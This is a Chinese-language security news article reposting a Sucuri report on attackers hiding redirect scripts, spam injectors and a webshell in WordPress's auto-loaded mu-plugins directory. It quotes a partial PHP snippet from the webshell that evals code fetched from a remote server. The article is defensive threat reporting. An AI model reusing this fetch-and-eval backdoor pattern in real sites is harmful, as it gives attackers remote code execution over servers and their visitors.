#  【安全圈】威胁通告：黑客组织利用WordPress MU插件目录隐匿恶意软件实现远程代码执行   
 安全圈   2025-03-31 19:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aBHpjnrGylgOvEXHviaXu1fO2nLov9bZ055v7s8F6w1DD1I0bx2h3zaOx0Mibd5CngBwwj2nTeEbupw7xpBsx27Q/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
**关键词**  
  
  
  
恶意软件  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aBHpjnrGyliaUVZnYj4hLiaqqgyIqCxZ8CnaDGTtNuJDEHIq7EkRKF9OKTCxicbKmibfH8UVt2Rib3cAOYJnkmKFE2g/640?wx_fmt=png&from=appmsg "")  
  
最近的发现揭示了一个令人担忧的趋势，威胁行为者正在策略性地将恶意代码隐藏在 WordPress 网站的 mu-plugins 目录中。  
  
该目录对于攻击者来说特别有价值，因为它会随 WordPress 自动加载，从而使得检测和删除更具挑战性。  
  
所发现的恶意软件变种采用了复杂的技术来保持持久性，同时执行从用户重定向到完全接管网站等有害功能。  
  
攻击针对 mu-plugins 文件夹，其中包含多种看似合法但实际上包含恶意代码的恶意软件类型。  
  
这些包括将毫无戒心的访问者发送到有害域的重定向脚本、为攻击者提供远程代码执行功能的网络外壳以及操纵网站内容以分发不必要材料的垃圾邮件注入器。  
  
Sucuri 的研究人员发现，这些恶意软件变种经过精心设计，通过排除搜索引擎爬虫和特权用户看到恶意行为来避免被发现。  
  
他们的分析表明，攻击者正在采用越来越复杂的技术来确保他们的恶意软件保持隐藏，同时最大限度地发挥其对目标网站的影响。  
  
感染这些恶意脚本的网站会遭受多重后果，包括声誉损害、潜在的数据盗窃、向访问者分发恶意软件以及未经授权的网站修改。  
  
最具破坏性的变体允许攻击者建立对受感染网站的持久访问，为长期利用奠定基础。  
## Webshell 分析：远程代码执行功能  
  
发现的最令人担忧的变体是一个伪装成合法 WordPress 插件文件的 Webshell，放置在 wp-content/mu-plugins/index.php 位置。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/aBHpjnrGyliaUVZnYj4hLiaqqgyIqCxZ8CgGeuI6jZ7H5QXwAzQy8KDLwQRia2fPYSIn2SpYqyD7iayZOfbuMdeJxA/640?wx_fmt=png&from=appmsg "")  
  
该 webshell 包含用于下载和执行远程 PHP 脚本的代码：  
```
if (curl_errno($connectionHandle))
    die('cURL error occurred: ' . curl_error($connectionHandle));
}
curl_close($connectionHandle);
eval("?>" . $retrievedCode);
```  
```
此代码片段演示了恶意软件如何使用 PHP 的 eval() 函数执行从远程服务器获取的任意代码。
```  
```

```  
  
该方法允许攻击者以与Web 服务器相同的权限运行命令，从而可能导致网站彻底被攻陷。  
  
一旦建立，此后门就会授予攻击者上传文件、删除内容和访问敏感信息的能力，将受感染的网站变成对访问者和连接系统发起进一步攻击的平台。  
  
来源：  
https://cybersecuritynews.com/threats-actors-hide-malware-in-wordpress-websites/  
  
  
  
  
  END    
  
  
阅读推荐  
  
  
[【安全圈】外包保洁员段某泄露3项国家机密！国安部披露细节：其为满足个人私欲，主动联系境外间谍情报机关](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652068802&idx=1&sn=a972008459c14da64c552bc0c08183bb&scene=21#wechat_redirect)  
  
  
  
[【安全圈】黑客技术自学成“提款机”，00后利用漏洞盗刷金豆非法套现10万](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652068802&idx=2&sn=6d43320c00ad321311bbe8ccf4c0cfef&scene=21#wechat_redirect)  
  
  
  
[【安全圈】小红书被曝高频获取这些信息！](https://mp.weixin.qq.com/s?__biz=MzIzMzE4NDU1OQ==&mid=2652068802&idx=3&sn=470b639c474ebb2e13bab2600d52b3af&scene=21#wechat_redirect)  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEft6M27yliapIdNjlcdMaZ4UR4XxnQprGlCg8NH2Hz5Oib5aPIOiaqUicDQ/640?wx_fmt=gif "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEDQIyPYpjfp0XDaaKjeaU6YdFae1iagIvFmFb4djeiahnUy2jBnxkMbaw/640?wx_fmt=png "")  
  
**安全圈**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCEft6M27yliapIdNjlcdMaZ4UR4XxnQprGlCg8NH2Hz5Oib5aPIOiaqUicDQ/640?wx_fmt=gif "")  
  
  
←扫码关注我们  
  
**网罗圈内热点 专注网络安全**  
  
**实时资讯一手掌握！**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCE3vpzhuku5s1qibibQjHnY68iciaIGB4zYw1Zbl05GQ3H4hadeLdBpQ9wEA/640?wx_fmt=gif "")  
  
**好看你就分享 有用就点个赞**  
  
**支持「****安全圈」就点个三连吧！**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/aBHpjnrGylgeVsVlL5y1RPJfUdozNyCE3vpzhuku5s1qibibQjHnY68iciaIGB4zYw1Zbl05GQ3H4hadeLdBpQ9wEA/640?wx_fmt=gif "")  
  
  
